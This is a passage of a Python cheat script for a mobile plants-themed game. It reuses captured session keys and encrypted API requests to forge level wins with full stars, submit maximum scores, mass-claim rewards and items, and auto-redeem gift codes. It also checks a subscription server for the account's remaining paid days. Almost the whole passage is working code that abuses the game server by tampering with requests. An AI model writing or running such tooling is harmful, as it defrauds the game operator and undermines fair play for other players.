        for id in i_value:
            data = {"req": "V988", "e": {"pi": pi, "sk": sk, "t": "0", "task_id": id, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("奖励领取成功")
            else:
                print("奖励领取失败")
    data = {"req": "V303", "e": {"al": [{"id": 10871, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        nested_data_str = decrypted_json['e']['d'][0]['data']
        nested_data = json.loads(nested_data_str)
        progress = nested_data['experience_value']
        max_limit = nested_data['experience_value_max']
        progress_info = f"当前进度({progress}/{max_limit})"
        print(progress_info)
        time.sleep(2)
    data = {"req":"V989","e":{"pi":pi,"sk":sk,"ui":ui},"ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("奖励领取成功")
    else:
        print()
def run_eightieth_seventh_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10903, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        nested_data_str = decrypted_json['e']['d'][0]['data']
        nested_data = json.loads(nested_data_str)
        l_value = nested_data['level']
        task_list = nested_data['task']
        max_value = task_list[-1]['limit']
        data={"req": "V1190", "e": {"l": l_value, "pi": pi, "s": max_value, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("刷分成功")
        else:
            print("刷分失败")
        data = {"req": "V303", "e": {"al": [{"id": 10903, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        nested_data_str = decrypted_json['e']['d'][0]['data']
        nested_data = json.loads(nested_data_str)
        task_list = nested_data['task']
        id_value = []
        for task in task_list:
            if task['s'] == 1:
                id_value.append(task['id'])
        for id in id_value:
            data = {"req": "V1192", "e": {"pi": pi, "sk": sk, "ti": id, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("奖励领取成功")
            else:
                print("奖励领取失败")
    data = {"req": "V1191", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("挂机奖励领取成功")
    else:
        print("挂机奖励领取失败")
def run_eightieth_eighth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10849, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        id_value = []
        l_value = ""
        level_value = []
        for d_item in decrypted_json["e"]["d"]:
            inner_data = json.loads(d_item["data"])
            if "awn" in inner_data and len(inner_data["awn"]) > 0:
                l_value = inner_data["awn"][0]
            if "world" in inner_data:
                target_world = None
                for w in inner_data["world"]:
                    if isinstance(w, dict) and w.get("name") == l_value:
                        target_world = w
                        break
                if target_world:
                    boss_info_list = target_world.get("bossInfo", [])
                    for idx, boss_item in enumerate(boss_info_list):
                        if not isinstance(boss_item, dict):
                            continue
                        ss = boss_item.get("ss", 0)
                        n_star = boss_item.get("nStar", 0)
                        n_star = int(n_star) if isinstance(n_star, (str, int)) else 0
                        condition1 = (ss == 1) and (n_star < 15)
                        condition2 = (n_star < 15) and (ss != 0)
                        if condition1 or condition2:
                            level_value.append(idx)
                    task_info = target_world.get("task_info", [])
                    for task_group in task_info:
                        if isinstance(task_group, list):
                            for task in task_group:
                                if isinstance(task, dict) and task.get("is_get") == 0:
                                    id_value.append(task["task_id"])
                        elif isinstance(task_group, dict) and task_group.get("is_get") == 0:
                            id_value.append(task_group["task_id"])
            if l_value and id_value:
                break
        print(f"找到需满星关卡{len(level_value)}个，需领取奖励{len(id_value)}个")
        if not level_value and not id_value:
            print("暂无需要处理的内容")
        for le in level_value:
            data ={"req": "V411", "e": {"level": le, "pi": pi, "sk": sk, "tgt": "15", "type": "2", "ui": ui, "win": "1", "world": l_value}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("秘境满星过关成功")
            else:
                print("秘境满星过关失败")
        for id in id_value:
            calculate_step = (id - 1000) / 5
            le_value = math.ceil(calculate_step - 1)
            data ={"req":"V415","e":{"index":id,"levelid":le_value,"pi":pi,"sk":sk,"ui":ui,"world":l_value},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("秘境奖励领取成功")
                try:
                    decrypted_resp = get_decrypted_data(url, data=response)
                    decrypted_json = json.loads(decrypted_resp)
                    reward_data = decrypted_json.get("e", {}).get("d", {})
                    if isinstance(reward_data, str):
                        try:
                            reward_data = json.loads(reward_data)
                        except:
                            reward_data = {}
                    rw_list = []
                    if isinstance(reward_data, dict):
                        for key in ["g", "rw", "reward", "items", "rewards", "list"]:
                            if key in reward_data and isinstance(reward_data[key], list):
                                rw_list = reward_data[key]
                                break
                    if rw_list:
                        for rw in rw_list:
                            if isinstance(rw, dict):
                                rid = rw.get("id", rw.get("i", "?"))
                                qty = rw.get("q", rw.get("qty", 1))
                                plant_info = formatted_plant.get(str(rid), {"name": f"ID={rid}", "pinzhi": "default"})
                                print(f"  获得: {plant_info['name']} x{qty}")
                except Exception as e:
                    pass
            else:
                print(f"秘境奖励领取失败，错误码：{response_data.get('r')}")
def run_eightieth_ninth_script():
    while True:
        pi, ui, sk = get_pi_sk(加密)
        user_input = input("\n请输入选择(1.公告中兑换码领取  2.自定义兑换码领取  空回车.退出)：").strip()
        if user_input == "1":
            data = {"req": "V600", "e": {"ci": "10011", "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            nl_list = decrypted_json['e']['d']['nl']
            code_list = []
            keywords = ["请先完成个人信息设置", "安卓", "ios"]
            android_pattern = r'安卓\s*[:：]?\s*([^\r\n]+)'
            for activity in nl_list:
                ct_content = activity['ct']
                if all(keyword in ct_content for keyword in keywords):
                    android_match = re.search(android_pattern, ct_content)
                    if android_match:
                        android_code = android_match.group(1).strip(' :：')
                        code_list.append(android_code)
                        print(f"活动ID：{activity['id']} | 标题：{activity['ht']}")
                        print(f"提取的安卓兑换码：{android_code}\n")
            for ci in code_list:
                data ={"req": "V330", "e": {"c": ci, "ch": 渠道, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                msg_value = decrypted_json['e']['d']['msg']
                print(f"\n{msg_value}")
                reward_list = decrypted_json['e']['d']['g']
                processed_rewards = []
                for reward in reward_list:
                    i_value = str(reward['i'])
                    q_value = reward['q']
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}: {q_value}")
        elif user_input == "2":
            user_input = input("\n请输入兑换码：").strip()
            data ={"req": "V330", "e": {"c": user_input, "ch": 渠道, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("兑换码领取成功")
                msg_value = decrypted_json['e']['d']['msg']
                print(msg_value)
                reward_list = decrypted_json['e']['d']['g']
                processed_rewards = []
                for reward in reward_list:
                    i_value = str(reward['i'])
                    q_value = reward['q']
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}: {q_value}")
            else:
                print("兑换码错误，领取失败")
        elif user_input == "":
            print("\n程序已退出")
            break
        else:
            print("\n输入无效！仅支持输入 1、2 或直接回车退出")
def run_nintieth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10788, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_str = decrypted_json['e']['d'][0]['data']
        data_dict = json.loads(data_str)
        si_list = data_dict['si']
        total_w = sum(elem["w"] for elem in si_list)
        result = []
        print("\n目前秘宝物品有：\n")
        for elem in si_list:
            str_i = str(elem["i"])
            plant_info = formatted_plant.get(
                str_i,
                {"name": f"未知物品({str_i})", "pinzhi": "default"}
            )
            plant_name = plant_info["name"]
            plant_pinzhi = plant_info["pinzhi"]
            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
            w_percent = round((elem["w"] / total_w) * 100, 2)
            result.append({
                "colored_name": f"{color_code}{plant_name}{RESET_COLOR}",
                "quantity": elem["q"],
                "weight_percent": w_percent
            })
        for item in result:
            print(f"{item['colored_name']}×{item['quantity']}   概率{item['weight_percent']}%")
        ois_list = data_dict['ois']
        ois_chinese = []
        for num in ois_list:
            str_i = str(num)
            plant_info = formatted_plant.get(
                str_i,
                {"name": f"未知物品({str_i})", "pinzhi": "default"}
            )
            plant_name = plant_info["name"]
            plant_pinzhi = plant_info["pinzhi"]
            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
            ois_chinese.append({
                "colored_name": f"{color_code}{plant_name}{RESET_COLOR}"
            })
        print("\n目前秘宝可选物品有：")
        if ois_chinese:
            for idx, item in enumerate(ois_chinese, start=1):
                print(f"{idx}. {item['colored_name']}")
            while True:
                try:
                    choice_idx = int(input("\n请输入你要选的物品序号："))
                    if 1 <= choice_idx <= len(ois_chinese):
                        p_value = ois_list[choice_idx - 1]
                        data = {"req": "V917", "e": {"p": p_value, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("秘宝植物选取成功")
                        else:
                            print("秘宝植物选取失败")
                        break
                    elif not choice_idx:
                        break
                except ValueError:
                    print("输入错误，请输入有效的数字序号")
                    break
        else:
            print("暂无可选物品")
            p_value = None
        while True:
            user_input = input("\n请输入选择(空回车.十连抽  1.重选植物   2.退出程序)：").strip()
            if user_input == "":
                data = {"req": "V916", "e": {"pi": pi, "sk": sk, "t": "3", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    decrypted_response = get_decrypted_data(url, data=response)
                    decrypted_json = json.loads(decrypted_response)
                    b_list = decrypted_json['e']['d']['b']
                    for reward in b_list:
                        i_value = str(reward['i'])
                        q_value = reward['q']
                        plant_info = formatted_plant.get(
                            i_value,
                            {"name": f"未知物品({i_value})", "pinzhi": "default"}
                        )
                        plant_name = plant_info["name"]
                        plant_pinzhi = plant_info["pinzhi"]
                        color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                        print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}: {q_value}")
                elif response_data.get("r") == 45031:
                    print(f"\n秘宝券不足10张")
                    return
                else:
                    print("抽取失败")
                    return
            elif user_input == "1":
                while True:
                    try:
                        choice_idx = int(input("\n请输入你要选的物品序号："))
                        if 1 <= choice_idx <= len(ois_chinese):
                            p_value = ois_list[choice_idx - 1]
                            data = {"req": "V917", "e": {"p": p_value, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("秘宝植物选取成功")
                            else:
                                print("秘宝植物选取失败")
                            break
                        else:
                            print(f"序号无效，请输入 1 到 {len(ois_chinese)} 之间的数字")
                    except ValueError:
                        print("输入错误，请输入有效的数字序号")
            elif user_input == "2":
                print("\n程序已退出")
                break
            else:
                print("\n输入无效！仅支持输入 1、2 或直接回车退出")
def run_nintieth_first_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V900","e":{"pi":pi,"pl":[{"i":"111227","q":"1"},{"i":"1291","q":"1"},{"i":"1251","q":"1"},{"i":"1209","q":"1"},{"i":"1233","q":"1"},{"i":"1280","q":"1"},{"i":"1269","q":"1"},{"i":"1244","q":"1"},{"i":"111239","q":"1"},{"i":"111250","q":"1"},{"i":"32001360","q":"1"},{"i":"32001350","q":"1"},{"i":"1013","q":"1"},{"i":"111064","q":"1"},{"i":"1038","q":"1"}],"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("领取成功")
    else:
        print("领取失败")
    oi2_list = [1001,1002,1003]
    for oi in oi2_list:
        data = {"req": "V301", "e": {"l": "2", "oi": oi, "pi": pi, "q": "0", "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("领取成功")
        else:
                print("领取失败")
    oi3_list = [1009,1020,1033,1044,1051,1069,1080,1091,111011,111039,111050]
    for oi in oi3_list:
        data = {"req": "V301", "e": {"l": "3", "oi": oi, "pi": pi, "q": "0", "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("领取成功")
        else:
            print("领取失败")
def run_nintieth_second_script():
    pi, ui, sk = get_pi_sk(加密)
    for i in range(15):
        data = {"req": "V855", "e": {"ln": "0", "pi": pi, "sk": sk, "type": "0", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("双人转盘领取成功")
        else:
            print("双人转盘领取失败")
            break
        time.sleep(0)
    data = {"req": "V303", "e": {"al": [{"id": 10861, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0","pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    data_str = decrypted_json['e']['d'][0]['data']
    data_dict = json.loads(data_str)
    rrbl_list = data_dict['rrbl']
    collected_box_list = None
    print("=" * 30)
    print("【直接获得的奖励】")
    print("=" * 30)
    has_direct_reward = False
    for item in rrbl_list:
        if item['isGet'] == 2:
            if 'list' in item and 'boxList' not in item:
                has_direct_reward = True
                for reward in item['list']:
                    i_value = str(reward['i'])
                    q_value = reward['q']
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}: {q_value}")
            elif 'boxList' in item:
                collected_box_list = item['boxList']
    if not has_direct_reward:
        print("暂无直接获得的奖励")
    print()
    if collected_box_list:
        print("=" * 30)
        print("【可选择的奖励】")
        print("=" * 30)
        box_options = []
        for idx, box_item in enumerate(collected_box_list, 1):
            i_value = str(reward['i'])
            q_value = reward['q']
            plant_info = formatted_plant.get(
                i_value,
                {"name": f"未知物品({i_value})", "pinzhi": "default"}
            )
            plant_name = plant_info["name"]
            plant_pinzhi = plant_info["pinzhi"]
            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
            print(f"{idx}. {color_code}{plant_name}{RESET_COLOR}: {q_value}")
        while True:
            try:
                choice = int(input("\n请输入你要选择的奖励序号："))-1
                data = {"req": "V855", "e": {"bai": choice, "gi": "7", "pi": pi, "sk": sk, "type": "1", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("藤蔓礼包领取成功")
                else:
                    print("藤蔓礼包领取失败")
                break
            except ValueError:
                print("输入无效！请输入正确的数字序号")
    else:
        print("=" * 30)
        print("【可选择的奖励】")
        print("=" * 30)
        print("暂无可选择的奖励")
def run_nintieth_third_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10890, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_str = decrypted_json['e']['d'][0]['data']
        data = json.loads(data_str)
        login_days = data['login_nun']
        gift_list = data['gift']
        status_list = data['status']
        limit_list = data['limit']
        i_list = []
        print(f'已累计来到庭院的天数：\033[92m{login_days}\033[0m 天\n')
        print('=== 奖励详情 ===\n')
        for idx, (gift, status) in enumerate(zip(gift_list, status_list), 1):
            print(f'奖励{idx}：')
            print(f'  状态：{"已领取" if status == 1 else "未领取"}')
            if idx == 6:
                print(f'  领取条件：2021年1月1日前注册的用户可领取')
            else:
                print(f'  领取条件：累计登录满 \033[92m{limit_list[idx-1]}\033[0m 天')
            reward_content = []
            for gif in gift:
                i_value = str(gif.get('i', ""))
                q_value = gif.get('q', 0)
                plant_info = formatted_plant.get(
                    i_value,
                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                print(f"  奖励内容: {color_code}{plant_name}{RESET_COLOR}×{q_value}")
            if idx != 6 and status == 0:
                if int(login_days) >= limit_list[idx-1]:
                    i_list.append(idx-1)
        if i_list:
            print(f'有奖励可领取，可领取奖励序号：{i_list}')
            for gi in i_list:
                data = {"req": "V508", "e": {"g": gi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("领取成功")
                else:
                    print("领取失败")
        else:
            print()
def run_nintieth_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10898, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_str = decrypted_json['e']['d'][0]['data']
        data_dict = json.loads(data_str)
        task_list = []
        for task in data_dict['taskList']:
            if task['status'] == 0:
                task_list.append(task['id'])
        for id in task_list:
            data ={"req": "V1122", "e": {"id": id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("抽奖券领取成功")
            else:
                print("抽奖券领取失败")
        activity_start_date = data_dict['st']
        activity_end_date = data_dict['et']
        current_date = datetime.now().strftime('%Y%m%d')
        current_date_dt = datetime.now()
        activity_start_dt = datetime.strptime(str(activity_start_date), '%Y%m%d')
        activity_end_dt = datetime.strptime(str(activity_end_date), '%Y%m%d')
        if current_date_dt < activity_start_dt:
            print("未到活动时间（活动尚未开始）")
        elif current_date_dt > activity_end_dt:
            print("未到活动时间（活动已结束）")
        else:
            online_periods = data_dict['online']
            current_hour = current_date_dt.hour
            found_active_period = False
            for period in online_periods:
                period_start = period['st']
                period_end = period['et']
                status = period['status']
                if period_start <= current_hour < period_end:
                    found_active_period = True
                    if status == 0:
                        data = {"req":"V1120","e":{"pi":pi,"sk":sk,"type":"0","ui":ui},"ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("领取成功")
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            i_value = str(decrypted_json['e']['d']['reward']['i'])
                            q_value = decrypted_json['e']['d']['reward']['q']
                            plant_info = formatted_plant.get(
                                i_value,
                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                            )
                            plant_name = plant_info["name"]
                            plant_pinzhi = plant_info["pinzhi"]
                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                            print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}")
                            print(f"获得的数量为: {q_value}")
                        else:
                            print("领取失败")
                    else:
                        print(f"当前阶段已获取")
                    break
            if not found_active_period:
                print("未到活动时间（当前不在活动时间段内）")
def run_nintieth_sixth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10849, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_str = decrypted_json['e']['d'][0]['data']
        data_dict = json.loads(data_str)
        world_list = data_dict['world']
        third_world = world_list[2]
        third_world_name = third_world['name']
        bossInfo_list_raw = third_world['bossInfo']
        bossInfo_list = []
        generalInfo_list_raw = third_world['generalInfo']
        generalInfo_list = []
        task_info = third_world.get('task_info', [])
        task_id_list = []
        for index, info in enumerate(generalInfo_list_raw):
            ss_value = info.get('ss')
            if ss_value != 2:
                generalInfo_list.append(index)
        for level in generalInfo_list:
            data = {"req":"V411","e":{"level":level,"pi":pi,"sk":sk,"tgt":"1,1,1","type":"3","ui":ui,"win":"1","world":third_world_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("过关成功")
            else:
                print("过关失败")
        for index, boss in enumerate(bossInfo_list_raw):
            ss = boss.get('ss')
            nStar = boss.get('nStar')
            if ss != 0 and isinstance(nStar, int) and nStar < 15:
                bossInfo_list.append(index)
        for le in bossInfo_list:
            data ={"req": "V411", "e": {"level": le, "pi": pi, "sk": sk, "tgt": "15", "type": "4", "ui": ui, "win": "1", "world": third_world_name}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("秘境满星过关成功")
            else:
                print("秘境满星过关失败")
        for task_group in task_info:
            for task in task_group:
                if task.get('is_get') == 0:
                    task_id = task.get('task_id')
                    if task_id is not None:
                        task_id_list.append(task_id)
        for id in task_id_list:
            calculate_step = (id - 1000) / 5
            le_value = math.ceil(calculate_step - 1)
            data ={"req":"V415","e":{"index":id,"levelid":le_value,"pi":pi,"sk":sk,"ui":ui,"world":third_world_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("秘境奖励领取成功")
            else:
                print("秘境奖励领取失败")
def run_nintieth_seventh_script():
    pi, ui, sk = get_pi_sk(加密)
    url = INFO_URL
    data = {"ui": ui, "e": "chaxunxinxi"}

    try:
        response = requests.post(url, json=data)
        response.raise_for_status()
        response_json = response.json()

        if response_json.get('status') == 'success':
            remaining_days = response_json.get('remaining_days', 0)
            s_flag = response_json.get('s', False)

            today = datetime.now().date()
            if remaining_days > 0:
                if s_flag:
                    end_date = today + timedelta(days=remaining_days)
                else:
                    end_date = today + timedelta(days=remaining_days)
            else:
                end_date = today

            if remaining_days > 0:
                if s_flag:
                    print(f"账号 {ui} 今日已使用，剩余 {remaining_days} 天，预计在 {end_date.strftime('%Y年%m月%d日')} 结束")
                else:
